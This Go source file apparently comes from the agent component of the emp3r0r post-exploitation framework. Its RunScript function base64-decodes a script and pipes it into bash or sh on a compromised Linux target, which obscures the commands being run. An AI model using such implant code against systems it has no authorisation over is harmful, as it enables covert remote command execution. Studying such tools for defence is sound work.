//go:build linux
// +build linux

package agent

import (
	"fmt"
	"os/exec"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// RunScript runs a bash script on target
func RunScript(script, args string) (output string, err error) {
	shell := "/bin/bash"
	if !util.IsFileExist(shell) {
		shell = "/bin/sh"
	}
	cmd := exec.Command(shell, "-c",
		fmt.Sprintf("echo -n '%s' | base64 -d | %s", script, shell))

	// collect output
	outBytes, err := cmd.CombinedOutput()
	if err != nil {
		output = fmt.Sprintf("%v, %s", err, outBytes)
	}
	output = string(outBytes)
	return
}
